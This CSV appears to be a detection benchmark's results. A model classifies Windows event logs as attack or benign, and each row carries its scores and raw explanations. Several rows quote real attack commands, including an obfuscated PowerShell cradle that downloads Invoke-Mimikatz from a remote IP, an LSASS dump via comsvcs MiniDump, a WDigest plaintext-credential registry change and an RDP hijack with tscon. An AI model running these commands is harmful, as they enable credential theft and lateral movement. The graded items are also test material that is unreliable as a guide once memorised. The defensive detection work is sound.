# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,BENIGN-ID4674-Defender reads Run key during scan.csv,,,processed,NO,100.0,100.0,YES,4674,MsMpEng.exe,WIN10-ADMIN$,,,\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,0.0,4.47,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4674
- Processes: MsMpEng.exe
- Accounts: WIN10-ADMIN$
- Commands: None
- Network: None
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

EXPLANATION:
This single Event 4674 shows the SYSTEM account (S-1-5-18 / WIN10-ADMIN$) accessing the Run registry key with read access (AccessMask 0x20019) via the legitimate Windows Defender process MsMpEng.exe. Antivirus scanning the Run key for persistence entries is normal, expected behavior, and no privilege escalation or suspicious command activity is present."
claude-opus-4-8,ID33205-SQL Server failed login with disabled SA account.evtx,easy,A,processed,YES,100.0,75.0,YES,33205,,sa,,10.23.23.9,,0.0,3.54,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: sa
- Commands: None
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
Multiple failed login attempts for the high-privilege 'sa' account originate from the same client IP (10.23.23.9) within seconds, with the reason ""An error occurred while evaluating the password"" and state 7, indicating repeated invalid password attempts. This pattern is consistent with a brute-force or password-guessing attack against the SQL Server administrator account rather than a single benign login mistake."
claude-opus-4-8,ID4625-failed login with denied access due to account restriction.evtx,easy,A,processed,YES,100.0,100.0,YES,4625,C:\Windows\System32\winlogon.exe,FS03$,,10.23.23.9,,0.0,3.58,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4625
- Processes: C:\Windows\System32\winlogon.exe
- Accounts: FS03$
- Commands: None
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
Multiple failed logon attempts (Event ID 4625) with LogonType 10 (RemoteInteractive/RDP) originate from the same source IP 10.23.23.9 within a short timeframe, with Status 0xC000006E indicating bad username or authentication failures. This repeated RDP failure pattern against FS03 from a single host is consistent with a brute-force or credential-guessing attack rather than a single accidental mistype."
claude-opus-4-8,ID1-WMI spwaning PowerShell process - WMImplant.evtx,easy,B,processed,YES,100.0,100.0,YES,1,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe",OFFSEC\admmig,"powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i')), C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",,,0.0,4.97,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: OFFSEC\admmig
- Commands: powershell $env:I4Pzl|.(Get-C`ommand ('{1}e{0}'-f'x','i')), C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
- Network: None
- Registry: None

EXPLANATION:
The PowerShell command uses obfuscation techniques including backtick string breaking (Get-C`ommand) and format-operator string assembly ('{1}e{0}'-f'x','i' resolves to ""iex""/Invoke-Expression) to execute the contents of an environment variable, which is a common evasion and fileless execution method. The parent process is WmiPrvSE.exe, indicating WMI-based remote/lateral execution, and the process runs at High integrity, consistent with a malicious attack chain rather than routine administration."
claude-opus-4-8,ID1-WMIexec process execution.evtx,easy,A,processed,YES,100.0,90.0,YES,1,C:\Windows\System32\cmd.exe,NT AUTHORITY\SYSTEM,"C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat",\\127.0.0.1\C$\__output,,33.3,8.11,5.4,5.0,2.7,3,16.1,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: C:\Windows\system32\cmd.exe  /Q /c C:\Windows\TEMP\execute.bat, C:\Windows\system32\cmd.exe /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat
- Network: \\127.0.0.1\C$\__output
- Registry: None

EXPLANATION:
This matches the classic Impacket-style remote command execution pattern (smbexec/wmiexec), where output is redirected to an admin share (\\127.0.0.1\C$\__output), executed via a temporary batch file in C:\Windows\TEMP, and immediately deleted to cover tracks. The activity runs as NT AUTHORITY\SYSTEM at System integrity, and the RuleName tagging plus self-cleaning command chain strongly indicate lateral movement / remote execution rather than legitimate administration."
claude-opus-4-8,ID3-7-10-Suspicious DLL loaded (CME+Mimikatz).evtx,easy,A,processed,YES,100.0,100.0,YES,"7, 3, 10","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,,"10.23.42.38, 10.23.123.11",,0.0,4.57,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7, 3, 10
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig
- Commands: None
- Network: 10.23.42.38, 10.23.123.11
- Registry: None

EXPLANATION:
PowerShell (PID 2668) loaded System.Management.Automation and WMI modules, then opened a handle to lsass.exe with GrantedAccess 0x143A, which is the access mask consistent with credential dumping from LSASS memory. The same PowerShell process also initiated repeated outbound TCP connections to 10.23.123.11 over port 443, indicating likely C2 or exfiltration activity following the credential access. The combination of LSASS access and beaconing network traffic from a single PowerShell process strongly indicates malicious behavior."
claude-opus-4-8,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, test-sql, dbo",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,3.91,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, test-sql, dbo
- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The login [test-sql] was added to the high-privilege [sysadmin] server role via an ALTER SERVER ROLE ADD MEMBER statement executed by OFFSEC\admmig, which succeeded. Granting sysadmin to a generic/service-style principal is a privilege-escalation and persistence technique commonly used by attackers to gain full control of a SQL Server instance."
claude-opus-4-8,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*",HACK-ME-PC.offsec.lan,,0.0,5.02,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
- Accounts: lambda-user, offsec\honey-pot1
- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
- Network: HACK-ME-PC.offsec.lan
- Registry: None

EXPLANATION:
The same user (lambda-user) registered an MSSQL SPN to an account and then enumerated all SPNs in the domain with ""setspn -T offsec -Q */*"", a classic reconnaissance step preceding a Kerberoasting attack. Registering a service principal name on a user account and broadly querying SPNs together indicate deliberate setup and discovery of Kerberoastable targets rather than routine administration."
claude-opus-4-8,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",,"admmig, hacker2, ROOTDC1$",,"10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,4.59,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4724, 4738
- Processes: None
- Accounts: admmig, hacker2, ROOTDC1$
- Commands: None
- Network: 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
The account admmig logs on remotely (LogonType 3) over Kerberos from 10.23.23.9, then accesses the IPC$ share and the samr named pipe (Event 5145), indicating SAMR remote account manipulation. Immediately after, admmig performs a password reset (4724) and account change (4738) on the account hacker2, a sequence consistent with an attacker resetting/modifying another account's credentials for persistence or lateral movement."
claude-opus-4-8,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,3.72,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This is a single 4673 event showing the use of SeMachineAccountPrivilege via the Security Account Manager service through lsass.exe, which is a normal occurrence when an account creates a machine/computer account. In isolation this event is routine and lacks any chain of escalating privileges or anomalous process activity that would indicate an attack."
claude-opus-4-8,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,80.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,7.85,4.8,5.0,4.0,3,16.8,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: None
- Registry: None

EXPLANATION:
The Security log was cleared (Event ID 1102), a common anti-forensics action, immediately followed by explicit credential use (4648) from admmig to log on as test10 via PowerShell with a network logon (LogonType 3). The chain then spawns cmd.exe running ""whoami"" reconnaissance, indicating lateral movement and credential abuse rather than routine activity, especially given the preceding log clearing."
claude-opus-4-8,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,5.78,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
A privilege escalation attack is evident: user ""hack1"" launched MSFRottenPotato.exe, immediately followed by an ANONYMOUS LOGON via NTLM V1 from localhost (127.0.0.1) used for token impersonation, then cmd.exe spawned under the SYSTEM account (S-1-5-18, FS03VULN$). This RottenPotato token-impersonation chain to SYSTEM, combined with the audit log being cleared (Event 1102), strongly indicates malicious activity."
claude-opus-4-8,"4624,4674,4688- CrackMap Exec SMB mimikatz.evtx",easy,B,processed,YES,100.0,79.2,YES,"4624, 4674, 4688","cmd.exe, powershell.exe, conhost.exe, services.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\tools\shell.cmd","ANONYMOUS LOGON, admmig, FS03VULN$","cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" & ( $pSHomE[4]+$pshome[30]+'x')(...)"" | powershell.exe -exec bypass -noni -nop -w 1 -C | C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""","10.23.123.11, https://10.23.123.11:2626/Invoke-Mimikatz.ps1, https://10.23.123.11:2626/","\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB",50.0,10.55,4.8,6.0,2.0,4,16.8,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 4674, 4688
- Processes: cmd.exe, powershell.exe, conhost.exe, services.exe, C:\Windows\System32\wbem\WmiPrvSE.exe, C:\tools\shell.cmd
- Accounts: ANONYMOUS LOGON, admmig, FS03VULN$
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" & ( $pSHomE[4]+$pshome[30]+'x')(...)""; powershell.exe -exec bypass -noni -nop -w 1 -C; C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd""
- Network: 10.23.123.11, https://10.23.123.11:2626/Invoke-Mimikatz.ps1, https://10.23.123.11:2626/
- Registry: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\WinSock2\Parameters, \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PERFLIB

EXPLANATION:
The logs show a remote NTLM logon (including an ANONYMOUS LOGON with NTLM V1) from 10.23.123.11 followed by execution of an obfuscated PowerShell command (decimal-encoded char array, ExecutionPolicy bypass, hidden window) that downloads and runs Invoke-Mimikatz to dump credentials (sekurlsa::logonpasswords) and POSTs results to an attacker server. The chained service-control access, certificate-validation bypass, and a subsequent SYSTEM-level cmd executing C:\tools\shell.cmd indicate credential theft and remote code execution consistent with a hands-on-keyboard intrusion."
claude-opus-4-8,ID1-CrackMapExec payload execution.evtx,easy,B,processed,YES,100.0,75.0,YES,1,"C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe",OFFSEC\admmig,"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101@116f46G83...'.sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')"", powershell.exe -exec bypass -noni -nop -w 1 -C ""...""",https://10.23.123.11:443/Invoke-Mimikatz.ps1,,16.7,9.29,4.5,6.0,3.3,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
- Accounts: OFFSEC\admmig
- Commands: cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "" -JOIN('91A78H101@116f46G83...'.sPlIT('@A@GkTfSH,' )|%{([iNt] $_ -AS [char])})| .( $ENv:comsPec[4,26,25]-JOIn'')"", powershell.exe -exec bypass -noni -nop -w 1 -C ""...""
- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1
- Registry: None

EXPLANATION:
WmiPrvSE.exe spawned cmd.exe which launched an obfuscated, encoded PowerShell command with execution-policy bypass, no-profile, and non-interactive flags (T1059/T1086), indicating WMI-based remote execution. The decoded payload downloads Invoke-Mimikatz.ps1 from 10.23.123.11 and runs a credential-dumping (""sekurlsa::logonpasswords"") command at High integrity, which is a clear malicious credential-theft attack chain."
claude-opus-4-8,ID400-800-CrackMapExec payload execution.evtx,easy,A,processed,YES,100.0,100.0,YES,"600, 400, 800, 403",powershell.exe,OFFSEC\admmig,powershell.exe -exec bypass -noni -nop -w 1 -C & ( $PshOMe[4]+$PshoME[30]+'X') | IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1') | Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit',"https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/",,0.0,8.80,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 600, 400, 800, 403
- Processes: powershell.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C & ( $PshOMe[4]+$PshoME[30]+'X'); IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'
- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/
- Registry: None

EXPLANATION:
The PowerShell HostApplication uses obfuscated execution (-exec bypass -noni -nop, char-array decoding, $PshOMe IEX invocation) to download and run Invoke-Mimikatz from a remote host and execute sekurlsa::logonpasswords for credential theft. It also disables TLS certificate validation and exfiltrates results via HTTP POST, all clear hallmarks of a credential-dumping attack. The Event ID 800 output confirms the script was flagged as malicious and blocked by antivirus."
claude-opus-4-8,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,90.0,YES,"1, 12, 13","C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe",OFFSEC\admmig,reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1,,"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,5.15,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 12, 13
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe
- Accounts: OFFSEC\admmig
- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
- Network: None
- Registry: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential

EXPLANATION:
The actor used reg.exe (spawned from cmd.exe) to set the WDigest UseLogonCredential value to 1, which forces Windows to store plaintext credentials in memory (LSASS). This is a well-known credential-theft preparation technique (T1112/T1003), and the paired CreateKey/SetValue events confirm the registry modification was completed, indicating malicious intent."
claude-opus-4-8,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,95.8,YES,"18, 1, 7, 11, 10","C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",,,0.0,7.79,5.8,6.0,4.0,3,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 18, 1, 7, 11, 10
- Processes: C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig
- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
- Network: None
- Registry: None

EXPLANATION:
This is a classic LSASS credential-dumping attack: a WmiPrvSE.exe parent (indicating remote WMI execution) spawned PowerShell which used rundll32.exe with comsvcs.dll MiniDump to dump the lsass.exe process memory to C:\Windows\Temp\76nivOxA.dmp. The Event ID 10 shows rundll32.exe opening lsass.exe with full access (0x1FFFFF) via a comsvcs.dll/dbghelp.dll call trace, confirming credential theft (T1003.001). The chain of WMI lateral movement, srvsvc pipe discovery, and LSASS dump strongly indicates malicious post-exploitation activity."
claude-opus-4-8,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,80.0,YES,"1, 10","C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""",,,0.0,5.30,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 10
- Processes: C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe
- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
- Commands: mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""
- Network: None
- Registry: None

EXPLANATION:
Mimikatz, a well-known credential-dumping tool, was executed at high integrity by OFFSEC\admmig and then accessed lsass.exe (GrantedAccess 0x1010) to extract credentials, with a CallTrace originating from the mimikatz binary. It also spawned a cmd.exe child process running as NT AUTHORITY\SYSTEM, indicating privilege escalation. This combination of LSASS access and SYSTEM-level shell from a credential-theft tool is clearly malicious."
claude-opus-4-8,ID4688-Audit policy enumerated.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4674","C:\Windows\System32\auditpol.exe, C:\Windows\System32\lsass.exe",admmig,"""C:\Windows\system32\auditpol.exe""  /get /category:*",,,0.0,4.45,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4674
- Processes: C:\Windows\System32\auditpol.exe, C:\Windows\System32\lsass.exe
- Accounts: admmig
- Commands: ""C:\Windows\system32\auditpol.exe""  /get /category:*
- Network: None
- Registry: None

EXPLANATION:
The Security audit log was cleared (Event 1102) immediately followed by reconnaissance of audit policy settings via auditpol.exe /get /category:* (Event 4688) by the same account admmig, with privileged LSA access (Event 4674, SeSecurityPrivilege). This sequence of log clearing plus audit-policy enumeration is a classic defense-evasion and discovery pattern indicating an attacker attempting to hide activity and assess logging coverage."
claude-opus-4-8,ID4688-Firewall configuration enumerated (command).evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688",C:\Windows\System32\netsh.exe,admmig,"netsh  advfirewall show allprofiles, netsh  a show allprofiles",,,0.0,3.84,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\netsh.exe
- Accounts: admmig
- Commands: netsh  advfirewall show allprofiles, netsh  a show allprofiles
- Network: None
- Registry: None

EXPLANATION:
The Security audit log was cleared (Event ID 1102) immediately before firewall reconnaissance commands were executed, a classic anti-forensic and defense-evasion pattern. The same account (admmig) then ran netsh commands to enumerate firewall profile configurations, indicating an attacker assessing host defenses after attempting to erase their tracks."
claude-opus-4-8,ID4688-Scheduled task configuration enumeration.evtx,easy,A,processed,YES,100.0,90.0,YES,"1102, 4688, 5145",C:\Windows\System32\schtasks.exe,admmig,schtasks  /query /xml,10.23.23.9,,0.0,4.03,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 5145
- Processes: C:\Windows\System32\schtasks.exe
- Accounts: admmig
- Commands: schtasks  /query /xml
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
The audit log was cleared (Event ID 1102), a strong indicator of attempted evidence destruction, followed by scheduled task enumeration via schtasks /query /xml and administrative share access to C$ from a remote host (10.23.23.9). This sequence of log clearing, reconnaissance, and lateral access by the admmig account is consistent with attacker post-compromise activity rather than routine administration."
claude-opus-4-8,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,86.0,YES,"4688, 4779, 4778","cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe, svchost.exe, winlogon.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, taskhostw.exe U",10.23.23.9,,0.0,7.07,5.2,5.0,4.0,3,17.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4779, 4778
- Processes: cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe, svchost.exe, winlogon.exe
- Accounts: FS01$, admmig, admmarsid
- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8, C:\Windows\system32\TSTheme.exe -Embedding, atbroker.exe, rdpclip, taskhostw.exe, C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}, taskhostw.exe U
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
The SYSTEM account (FS01$, S-1-5-18) launched ""tscon 2 /dest:rdp-tcp#8"" via cmd.exe, which hijacks an existing RDP session without credentials — a classic RDP session hijacking technique. The 4779 disconnect of admmig's session and the 4778 reconnect of admmarsid to the same RDP-Tcp#8 from JUMP01 (10.23.23.9) confirms one identity took over another user's session, representing lateral movement and privilege abuse."
